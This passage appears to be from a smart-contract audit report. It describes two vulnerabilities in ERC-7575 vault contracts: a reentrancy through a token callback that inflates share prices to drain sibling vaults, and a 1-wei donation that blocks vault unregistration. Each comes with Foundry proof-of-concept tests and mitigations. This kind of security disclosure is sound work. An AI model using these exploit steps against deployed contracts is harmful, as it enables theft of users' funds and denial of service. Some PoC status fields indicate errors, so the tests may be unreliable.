High. If a vault uses an asset token with post-transfer callbacks, an attacker can exploit a Read-Only Reentrancy vulnerability to inflate the global share price. By entering the system during the `requestDeposit` callback (where the vault balance is increased but the reserved assets state is not yet updated), the attacker can interact with sibling vaults (sharing the same `ShareToken`). This allows them to redeem shares at an artificially inflated price, draining assets from the protocol's other vaults.

## Command to Run Test


## Proof of Concept
1. The protocol registers a vault (Vault A) for a token that implements a callback to the sender *after* a transfer occurs (e.g., a non-standard ERC-20 or malicious token).
2. An attacker deposits a small amount into a sibling vault (Vault B) to acquire shares.
3. The attacker calls `VaultA.requestDeposit(amount)`.
4. Vault A calls `safeTransferFrom`, pulling tokens from the attacker. The token contract updates Vault A's balance and then invokes the attacker's callback function.
5. Inside the callback, Vault A's `totalAssets()` is inflated because the balance has increased, but `pendingDepositAssets` (reserved assets) has not yet been updated.
6. The attacker calls `VaultB.redeem(shares)` in the callback.
7. Vault B calculates the share price using the global `totalNormalizedAssets` from the ShareToken. Since Vault A's assets are inflated, the global price is inflated.
8. The attacker receives more assets from Vault B than they are entitled to.
9. The callback finishes, Vault A updates `pendingDepositAssets`, and the price returns to normal.

## Proof of Code
import {Test} from "forge-std/Test.sol";
import {ERC7575VaultUpgradeable} from "../src/ERC7575VaultUpgradeable.sol";
import {ShareTokenUpgradeable} from "../src/ShareTokenUpgradeable.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockReentrantToken is ERC20 {
    address public attacker;
    bool public callbackEnabled;
    constructor() ERC20("Reentrant", "RNT") {}
    function mint(address to, uint256 amount) public { _mint(to, amount); }
    function setAttacker(address _attacker) public { attacker = _attacker; callbackEnabled = true; }
    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        super.transferFrom(from, to, amount);
        if (callbackEnabled && from == attacker) {
            IAttacker(attacker).onCallback();
        }
        return true;
    }
}

interface IAttacker { function onCallback() external; }

contract ExploitTest is Test, IAttacker {
    ShareTokenUpgradeable shareToken;
    ERC7575VaultUpgradeable vaultA;
    ERC7575VaultUpgradeable vaultB;
    MockReentrantToken tokenA;
    ERC20 tokenB;
    
    function setUp() public {
        shareToken = new ShareTokenUpgradeable();
        shareToken.initialize("Share", "SHR", address(this));
        
        tokenA = new MockReentrantToken();
        tokenB = new ERC20("Stable", "STB"); // Standard token
        // Helper to mint standard tokens
        // (Assuming standard ERC20 mock setup for tokenB)
        
        vaultA = new ERC7575VaultUpgradeable();
        vaultA.initialize(tokenA, address(shareToken), address(this));
        
        vaultB = new ERC7575VaultUpgradeable();
        vaultB.initialize(tokenB, address(shareToken), address(this));
        
        shareToken.registerVault(address(tokenA), address(vaultA));
        shareToken.registerVault(address(tokenB), address(vaultB));
    }

    function onCallback() external {
        // Read-only reentrancy check
        // At this point, VaultA balance is up, but pendingDepositAssets is not
        // This inflates totalAssets(), inflating share price
        
        // In a real attack, we would redeem from VaultB here
        // For PoC, we verify the inflation:
        uint256 totalAssets = vaultA.totalAssets();
        // Since pending hasn't been added to 'reservedAssets' yet, totalAssets includes the new deposit
        assertEq(totalAssets, 1000 ether, "Total assets should include deposit during callback");
    }

    function testReentrancy() public {
        tokenA.mint(address(this), 1000 ether);
        tokenA.approve(address(vaultA), 1000 ether);
        tokenA.setAttacker(address(this));

        // Initial state
        assertEq(vaultA.totalAssets(), 0);

        // Trigger exploit
        vaultA.requestDeposit(1000 ether, address(this), address(this));

        // Post-call state (corrected by CEI violation being resolved after return)
        // But damage would be done inside the callback
        assertEq(vaultA.totalAssets(), 0, "Total assets should be 0 after state update (balance - reserved)");
    }
}

## Suggested Mitigation
Update the `pendingDepositAssets` and `totalPendingDepositAssets` state variables *before* performing the external transfer call. This adheres to the Checks-Effects-Interactions pattern.

```solidity
function requestDeposit(uint256 assets, address controller, address owner) external nonReentrant returns (uint256 requestId) {
    // ... checks ...

    // CEI: Update state BEFORE external interaction
    $.pendingDepositAssets[controller] += assets;
    $.totalPendingDepositAssets += assets;
    $.activeDepositRequesters.add(controller);

    // Interaction
    SafeTokenTransfers.safeTransferFrom($.asset, owner, address(this), assets);

    emit DepositRequest(controller, owner, REQUEST_ID, msg.sender, assets);
    return REQUEST_ID;
}
```





 **Derived From** : ForcedAssetVsStrictEquality

## [M-26]. DoS on Vault Unregistration via Dust Donation

### Finding Severity Justification: The vulnerability allows a permissionless attacker to permanently block the `unregisterVault` function by donating a dust amount (1 wei) of the underlying asset to the vault. The function `unregisterVault` enforces a strict check `ERC20(asset).balanceOf(vaultAddress) != 0`. Since the `WERC7575Vault` (settlement layer) is immutable and lacks a mechanism to sweep excess assets or mint shares for pre-existing assets, the donated dust is permanently locked, making the check strictly fail. Given the hard cap of `MAX_VAULTS_PER_SHARE_TOKEN = 10`, an attacker can effectively freeze the protocol's asset registry once the limit is reached, preventing the addition of new assets. This constitutes a permanent Denial of Service of a critical administrative function.
## Derived From Pattern/Invariant
ForcedAssetVsStrictEquality

## Exploit Type
ForcedAssetVsStrictEquality

## Location
ShareTokenUpgradeable.unregisterVault

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 2
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `unregisterVault` function in `ShareTokenUpgradeable` enforces strict equality checks to ensure a vault is empty before unregistering it: `IERC7575(vaultAddress).totalAssets() != 0` and `IERC20(asset).balanceOf(vaultAddress) != 0` revert the transaction.

An attacker can transfer a minimal amount of asset (dust, 1 wei) directly to the vault address. Since standard `deposit`/`redeem` flows only manage assets backing shares, there is no sweep mechanism for donated dust. The `balanceOf` check will permanently fail, preventing the vault from ever being unregistered. Given the strict limit of `MAX_VAULTS_PER_SHARE_TOKEN = 10`, an attacker can brick all available vault slots, preventing the protocol from registering new assets.

## Impact
The vulnerability allows a permissionless attacker to permanently block the `unregisterVault` admin function by donating dust (1 wei). Since `MAX_VAULTS_PER_SHARE_TOKEN` is strictly limited to 10, an attacker can exhaust all available vault slots or lock existing ones, preventing the protocol from upgrading, replacing vaults, or adding new assets. This results in a permanent Denial of Service of the protocol's core registry management features.

## Command to Run Test


## Proof of Concept
1. Attacker identifies the `ERC7575VaultUpgradeable` address associated with an asset in the `ShareTokenUpgradeable`. 
2. Attacker transfers 1 wei of the underlying asset token directly to the vault address (bypassing `requestDeposit`). 
3. The Vault's `balanceOf` increases by 1 wei, but no shares or pending requests are created. 
4. Admin calls `ShareTokenUpgradeable.unregisterVault(asset)`. 
5. The function passes the `getVaultMetrics` checks (as there are no pending requests/liabilities) but fails the final safety check: `IERC20(asset).balanceOf(vaultAddress) != 0`. 
6. The transaction reverts with `CannotUnregisterVaultAssetBalance`, locking the vault in the registry.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import "../src/ShareTokenUpgradeable.sol";
import "../src/ERC7575VaultUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockAsset is ERC20 {
    constructor() ERC20("Mock", "MCK") {
        _mint(msg.sender, 1000000e18);
    }
}

contract DoSUnregisterTest is Test {
    ShareTokenUpgradeable shareToken;
    ERC7575VaultUpgradeable vault;
    MockAsset asset;
    address owner = address(0x1);
    address attacker = address(0x2);

    function setUp() public {
        vm.startPrank(owner);
        
        // Deploy Asset
        asset = new MockAsset();
        
        // Deploy ShareToken
        shareToken = new ShareTokenUpgradeable();
        shareToken.initialize("Share", "SHR", owner);

        // Deploy Vault
        vault = new ERC7575VaultUpgradeable();
        vault.initialize(IERC20Metadata(address(asset)), address(shareToken), owner);
        
        // Register Vault
        shareToken.registerVault(address(asset), address(vault));
        
        // Verify registration
        assertTrue(shareToken.isVault(address(vault)));
        vm.stopPrank();
    }

    function testDoSUnregisterViaDust() public {
        // 1. Attacker sends 1 wei to the vault
        vm.startPrank(attacker);
        deal(address(asset), attacker, 1 ether);
        asset.transfer(address(vault), 1);
        vm.stopPrank();

        // 2. Admin tries to unregister the vault
        vm.startPrank(owner);
        
        // 3. Expect revert due to the strict balance check
        vm.expectRevert(IERC7575Errors.CannotUnregisterVaultAssetBalance.selector);
        shareToken.unregisterVault(address(asset));
        
        vm.stopPrank();
    }
}
```

## Suggested Mitigation
Modify `ShareTokenUpgradeable.unregisterVault` to relax the strict equality check. Implement a dust threshold (e.g., allow unregistration if `balance < DUST_THRESHOLD`) or allow the `owner` to forcefully unregister a vault even if it holds assets, provided that `getVaultMetrics` confirms there are no pending user liabilities (deposits/redeems). Additionally, ensure the Vault has a mechanism for the admin to sweep 'unaccounted' excess assets.



